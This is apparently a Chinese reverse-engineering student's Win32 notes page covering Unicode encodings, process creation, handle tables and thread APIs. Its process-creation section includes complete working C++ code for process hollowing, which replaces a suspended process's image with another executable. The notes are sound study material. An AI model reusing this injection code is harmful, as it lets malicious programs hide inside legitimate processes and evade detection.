<strong>如何存储UNICODE</strong></h3><p><strong>UTF-16\UTF-8是UNICODE的实现方式</strong></p><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h4><p>UTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的UNICODE编码处于什么范围而定，有可能是2个字节，也有可能是4个字节，现在机器上的UNCODE 编码一般指的就是UTF-16</p><p>因为它任何符号都是以2个字节为单位，对于A,B,C这种简单的符号，一个字节就够了，所以用UTF-16可能会浪费空间，在网络传输中效率可能会慢，</p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard-16457555233811.png" class="" title="img"><p>比如在记事本中写入 “AB字”，然后分别存储为UTF-16 或  UTF-8的格式</p><p>“字”    UTF-16   是  5B 57<br>​          UTF-8     是  E5 AD 97<br><strong>E5  AD  97</strong><br><strong>1110</strong> <strong>0101</strong> <strong>10****10 1101</strong>  <strong>10****01 0111</strong><br>红色部分拼接为0101 1011 0101 0111，即<strong>5B 57</strong></p><p><strong>那么给定一个文本，怎么知道是解析为UTF-16还是UTF-8呢？</strong></p><h4 id="BOM-Byte-Order-Mark-解决解析时候的问题"><a href="#BOM-Byte-Order-Mark-解决解析时候的问题" class="headerlink" title="BOM (Byte Order Mark)(解决解析时候的问题)"></a><strong>BOM (Byte Order Mark)(解决解析时候的问题)</strong></h4><p>UTF-8             ||            EF BB BF<br>UTF-16(LE)      ||           FF FE<br>UTF-16(BE)     ||           FE FF<br>这是前缀</p><hr><h2 id="进程的创建过程"><a href="#进程的创建过程" class="headerlink" title="进程的创建过程"></a>进程的创建过程</h2><p>进程提供程序所需的资源，如：数据，代码等等。进程是静止不动的</p><p>进程内存空间的地址划分</p><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220225103004727.png" class="" title="image-20220225103004727"><p>一个进程里面含有一堆PE文件</p><h3 id="进程是怎么创建的"><a href="#进程是怎么创建的" class="headerlink" title="进程是怎么创建的"></a>进程是怎么创建的</h3><p>任何进程都是别的进程创建的：CreateProcess</p><ol><li><p>映射EXE文件</p></li><li><p>创建内核对象EPROCESS</p></li><li><p>映射DLL文件(ntdll.dll) 所有EXE都得用到这个DLL文件</p></li><li><p>创建线程内核对象ETHREAD</p></li><li><p>系统启动线程</p><p>​    映射DLL（ntdll.LdrInitializeThunk）</p><p>​    线程开始执行</p></li></ol><p>可以在第4步与第5步之间做一些猥琐的事情，怎么在第4步与第5步之间搞事情呢？？？</p><p>可以在CreateProcess这个函数的第6个参数__in         DWORD <em>dwCreationFlags</em>,，将其设置为<strong>CREATE_SUSPENDED</strong>，然后线程就会被挂起，然后在这个地方进行PE映像切换（傀儡进程），这个在《逆向工程核心原理》第56章有讲，因为这里是讲进程的创建过程，所以对PE影响切换不再描述</p><p>这里是这种技术的实验代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* _TZwUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">PeLoad</span><span class="params">(HANDLE hProcess, BYTE* peFile, BYTE* peRam, <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"><span class="function">CHAR* <span class="title">LoadFile</span><span class="params">(CHAR* filePath)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">FileBufferToImageBuffer</span><span class="params">(LPVOID pFileBuffer, LPVOID pImageBuffer)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line">CHAR szName[] = <span class="string">&quot;E:\\TrayS v1.1.3\\TrayS_x86\\TrayS.exe&quot;</span>;</span><br><span class="line">si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"><span class="comment">//创建傀儡进程</span></span><br><span class="line">BOOL res = <span class="built_in">CreateProcess</span>(</span><br><span class="line">szName,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line">CREATE_SUSPENDED,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;si,</span><br><span class="line">&amp;pi</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;错误CODE: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取外壳的CONTEXT结构</span></span><br><span class="line">CONTEXT contex;</span><br><span class="line">contex.ContextFlags = CONTEXT_FULL;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;contex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;子进程PID: %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%#X\n&quot;</span>, contex.Eax); <span class="comment">//OEP + IMAGEBASE</span></span><br><span class="line">BYTE* baseAddress = (BYTE*)(contex.Ebx + <span class="number">8</span>);</span><br><span class="line">DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(pi.hProcess, baseAddress, &amp;dwImageBase, <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载外壳程序的文件镜像</span></span><br><span class="line">HMODULE hModuleNt = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hModuleNt == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;获取ntdll句柄失败\n&quot;);</span></span><br><span class="line"><span class="built_in">TerminateThread</span>(pi.hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">_TZwUnmapViewOfSection pZwUnmapViewOfSection = (_TZwUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(hModuleNt, <span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">pZwUnmapViewOfSection</span>(pi.hProcess, (PVOID)dwImageBase);</span><br><span class="line"></span><br><span class="line">CHAR szFileName[] = <span class="string">&quot;F:\\_重学RE笔记\\WIN32_PE学习\\傀儡进程\\傀儡进程\\假装自己是病毒.exe&quot;</span>;</span><br><span class="line">CHAR * PEFILE = <span class="built_in">LoadFile</span>(szFileName);</span><br><span class="line"></span><br><span class="line">IMAGE_DOS_HEADER* pidhsrc = (IMAGE_DOS_HEADER*)PEFILE;</span><br><span class="line">IMAGE_NT_HEADERS* pinhsrc = (IMAGE_NT_HEADERS*)(pidhsrc-&gt;e_lfanew + PEFILE);</span><br><span class="line">LPVOID pImageBase = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (LPVOID)pinhsrc-&gt;OptionalHeader.ImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((DWORD)pImageBase != pinhsrc-&gt;OptionalHeader.ImageBase)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;VirtualAllocEx 错误码: 0x%X\n&quot;, GetLastError()); // 0x1e7 试图访问无效地址</span></span><br><span class="line"><span class="comment">//printf(&quot;申请到的指针: 0x%X, 期望的地址: 0x%X\n&quot;, (DWORD)pImageBase, pinhsrc-&gt;OptionalHeader.ImageBase);</span></span><br><span class="line"><span class="built_in">TerminateThread</span>(pi.hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//7、拉伸PE文件，放到此位置</span></span><br><span class="line"><span class="built_in">PeLoad</span>(pi.hProcess, (BYTE *)PEFILE, (BYTE*)pImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"></span><br><span class="line"><span class="comment">//8、修改外壳程序的Context</span></span><br><span class="line">contex.Eax = pinhsrc-&gt;OptionalHeader.AddressOfEntryPoint + pinhsrc-&gt;OptionalHeader.ImageBase;</span><br><span class="line">DWORD imageBase = pinhsrc-&gt;OptionalHeader.ImageBase;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, <span class="built_in">LPVOID</span>(contex.Ebx + <span class="number">8</span>), &amp;imageBase, <span class="number">4</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;contex);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"><span class="comment">//释放资源区</span></span><br><span class="line"><span class="built_in">free</span>(PEFILE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模拟PE加载</span></span><br><span class="line"><span class="comment">//hProcess:进程句柄</span></span><br><span class="line"><span class="comment">//peFile:PE拉伸前的地址（在本进程中）</span></span><br><span class="line"><span class="comment">//peRam：ImageBase（在hProcess进程中）</span></span><br><span class="line"><span class="comment">//size:PE拉伸后对齐的大小</span></span><br><span class="line"><span class="function">BOOL <span class="title">PeLoad</span><span class="params">(HANDLE hProcess, BYTE* peFile, BYTE* peRam, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE* peImage = (BYTE*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">FileBufferToImageBuffer</span>(peFile, peImage);</span><br><span class="line">BOOL isSuccess = <span class="built_in">WriteProcessMemory</span>(hProcess, peRam, peImage, size, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">free</span>(peImage);</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将文件读取到内存</span></span><br><span class="line"></span><br><span class="line"><span class="function">CHAR* <span class="title">LoadFile</span><span class="params">(CHAR* filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE* fpShellFile;</span><br><span class="line"><span class="built_in">fopen_s</span>(&amp;fpShellFile, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fpShellFile == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加载病毒失败\n&quot;</span>);</span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fseek</span>(fpShellFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">DWORD dwShellFileSize = <span class="built_in">ftell</span>(fpShellFile);</span><br><span class="line">CHAR* pShellFile = (CHAR*)<span class="built_in">malloc</span>(dwShellFileSize);</span><br><span class="line"><span class="built_in">fseek</span>(fpShellFile, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"><span class="built_in">fread</span>(pShellFile, <span class="number">1</span>, dwShellFileSize, fpShellFile);</span><br><span class="line"><span class="built_in">fclose</span>(fpShellFile);</span><br><span class="line"><span class="keyword">return</span> pShellFile;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将PE文件拉伸</span></span><br><span class="line"><span class="comment">// pFileBuffer：源文件读到内存去的首地址</span></span><br><span class="line"><span class="comment">// pImageBuffer： 拉伸后文件读到内存去的首地址</span></span><br><span class="line"><span class="comment">// 返回拉伸后的文件在内存中对齐后的大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">FileBufferToImageBuffer</span><span class="params">(LPVOID pFileBuffer, LPVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pFileBuffer;</span><br><span class="line">IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)(pDosHeader-&gt;e_lfanew + (DWORD)pDosHeader);</span><br><span class="line">IMAGE_FILE_HEADER* pPEHeader = (IMAGE_FILE_HEADER*)((DWORD)pNtHeader + <span class="number">4</span>);</span><br><span class="line">IMAGE_OPTIONAL_HEADER32* pOptionHeader = (IMAGE_OPTIONAL_HEADER32*)((DWORD)pPEHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_FILE_HEADER));</span><br><span class="line">IMAGE_SECTION_HEADER* pSectionHeader = (IMAGE_SECTION_HEADER*)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(pImageBuffer, <span class="number">0</span>, pNtHeader-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"><span class="comment">//复制DOS头 + PE头 + 节表 + 文件对齐</span></span><br><span class="line"><span class="built_in">memcpy</span>(pImageBuffer, pFileBuffer, pNtHeader-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID)((DWORD)pImageBuffer + pSectionHeader[i].VirtualAddress), (LPVOID)((DWORD)pFileBuffer + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pNtHeader-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h2><p><strong>1、什么是内核对象？</strong></p><p>像进程、线程、文件、互斥体、事件等在内核都有一个对应的结构体，这些结构体由内核负责故案例。我们管这样的对象叫做内核对象。</p><p><strong>2、 如何管理内核对象</strong></p><p>通过句柄表</p><p><strong>3、每个进程都有一个句柄表</strong></p><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220304105325965.png" class="" title="image-20220304105325965"><p>不是每个内核对象都有句柄表，只有进程内核对象才有句柄表。</p><p><strong>4、多进程共享一个内核对象</strong></p> <img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220304110558458.png" class="" title="image-20220304110558458"><p>句柄表是一个私有的值，句柄只有在本进程中才有意义</p><p>CloseHandle使内核对象的引用计数 - 1，一般情况下引用计数为0了，没有任何指针指向它，这个内核对象就会被移除，但是进程内核对象和线程内核对象是特例，只有关闭所有的线程句柄和终止掉线程两个条件同时满足的时候，这个线程内核对象才会被移除。</p><p><strong>5、 句柄是否可以被继承</strong></p><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220304162731477.png" class="" title="image-20220304162731477"><p>在创建一个内核对象的时候，一定会有一个参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL bInheritHandle;<span class="comment">//该内核对象是否可以被继承</span></span><br><span class="line">&#125; SECURITY_ATTRIBUTES, </span><br></pre></td></tr></table></figure><p><strong>6、进程是否能够继承父进程的句柄</strong></p><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220304163904932.png" class="" title="image-20220304163904932"><p>当用CreateProcess创建进程的时候，第5个参数<em><strong>bInheritHandles</strong></em>如果设置为TRUE，那么父进程句柄表中可以被继承的内核对象句柄就会被继承过去，具体继承方式如上图所示，就是将整个句-柄表复制过去，不能继承的填充0，这样的话，在子进程中的句柄值可以与父进程一模一样</p><h2 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h2> <img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/image-20220304164625661.png" class="" title="image-20220304164625661"><p> PID是全局句柄表的索引，所以它在 所有进程中都有效</p><p> 当前进程的 进程句柄 是当前进程句柄表的索引，所以它只在本进程有效</p><h3 id="工作路径与模块路径"><a href="#工作路径与模块路径" class="headerlink" title="工作路径与模块路径"></a>工作路径与模块路径</h3><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard-1646384460916.png" class="" title="img"><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard-1646384575604.png" class="" title="img"><p>当前模块路径是不变的，文件放在哪，他就是啥</p><p>但是工作路径的话就不同了，工作路径是父进程通过CreateProcess这个API传给他的，通过参数 __in_opt     LPCTSTR <em>lpCurrentDirectory</em>将工作目录传给子进程。</p><p>如下例: </p><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard-1646384460917.png" class="" title="img"><img src="/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/clipboard-1646384460918.png" class="" title="img"><h3 id="其他API"><a href="#其他API" class="headerlink" title="其他API"></a>其他API</h3><p>获取进程PID: GetCurrentProcessId<br>获取进程句柄: GetCurrentProcess<br>获取命令行: GetCommandLine<br>获取启动信息: GetStartupInfo<br>遍历进程ID: EnumProcesses<br>快照: CreateToolhelp32Snapshot</p><hr><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p><strong>1、什么是线程</strong></p><p>​    CreateThread 创建线程</p><ol><li><p>线程是附属在进程上的执行实体，是代码的执行流程</p></li><li><p>一个进程可以包含多个线程，但一个进程至少要包含一个线程</p></li></ol><p><strong>2、控制线程</strong></p><ol><li><p>暂停线程恢复线程</p><p>SuspendThread()</p><p>ResumeThread()            //可以根据这个函数的返回值来判断线程是否挂起</p></li><li><p>等待线程结束</p><p>WaitForSingleObject()</p><p>WaitForMultipleObject()</p><p>GetExitCodeThread()</p></li><li><p>获取线程环境(线程切换的时候要保存环境)</p><p>GetThreadContext()</p><p>SetThreadContext()</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WIN32学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win32 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
